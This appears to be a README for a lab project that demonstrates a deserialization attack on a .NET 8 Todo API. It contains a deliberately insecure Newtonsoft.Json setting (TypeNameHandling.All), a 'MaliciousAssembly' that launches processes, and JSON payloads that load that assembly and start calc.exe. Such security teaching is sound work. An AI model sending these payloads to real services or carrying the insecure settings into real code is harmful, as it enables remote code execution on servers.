# .NET 8 Serialization Vulnerability

Exploiting JSON serialization vulnerabilities in .NET is more challenging than in the .NET Framework. The .NET Framework gadget chains exploited by [ysoserial.net](https://github.com/pwntester/ysoserial.net) have been remediated in .NET. 

This exploit requires setting _TypeNameHandling_ to _TypeNameHandling.All_. System.Text.Json does not natively allow type names to be included in serialized messages and is recommended. Further, with .NET 6+ it is not possible to override the default JSON serializer from System.Text.Json when using minimal APIs. See [Minimal APIs quick reference](https://learn.microsoft.com/en-us/aspnet/core/fundamentals/minimal-apis?view=aspnetcore-6.0#configure-json-deserialization-options-for-body-binding).

``` C#
builder.Services.AddControllers().AddNewtonsoftJson(
    options =>
    {
        options.SerializerSettings.TypeNameHandling = TypeNameHandling.All;
        options.SerializerSettings.ReferenceLoopHandling = ReferenceLoopHandling.Ignore;
    });
```

The MaliciousAssembly project includes a property that launches a process using the value of the property:

``` C#
using System.Diagnostics;
. . .
public string ProcessLaunch
{
    get
    {
        return processName;
    }
    set
    {
        processName = value;
        Process.Start(value);
    }
}
```

The build process copies the MaliciousAssembly to the bin directory of the Todo API as _someimage.png_. This simulates an insecure file upload process. Which can be exploited through the _Metadata_ property of the _TodoItem_.

``` C#
public class TodoItem
{
    public long Id { get; set; }
    public string? Name { get; set; }
    public bool IsComplete { get; set; }

    public Dictionary<string, object>? Metadata { get; set;}
}

```

This can be exploited using the following message:

``` JSON
{
  "name": "walk dog1",
  "isComplete": true,
  "metadata":
    {
        "data2": {
		   "$type": "System.IO.FileInfo, System.IO.FileSystem",
		   "fileName": "rce-test.txt"
	     }
    }
}
```
## Load the malicious file

The first REST API call loads the malicious file using:

``` JSON
POST https://localhost:7040/api/TodoItems HTTP/1.1
content-type: application/json

{
  "name": "load assembly",
  "isComplete": true,
  "metadata":
    {
        "data2":  {"$type":"System.Configuration.Install.AssemblyInstaller, 
            System.Configuration.Install",
            "Path":"someimage.png"}
    }
}
```
The _Path_ is local; however, in a production environment, it could be loaded from a temporary directory or another local directory.

## Invoke the Malicious Property

Now that the Assembly is in the AppDomain, the ProcessLaunch property can be invoked:

``` JSON 
POST https://localhost:7040/api/TodoItems HTTP/1.1
content-type: application/json

{
  "name": "launch calc",
  "isComplete": true,
  "metadata":
    {
        "launchdata":  
           { "$type":"MaliciousAssembly.ProcessStarter, MaliciousAssembly",
             "ProcessLaunch":"calc.exe" }
    }
}
```

These calls are available in the _requests.http_ file. Running these examples in Visual Studio Code requires the [REST Client](https://marketplace.visualstudio.com/items?itemName=humao.rest-client) extension.



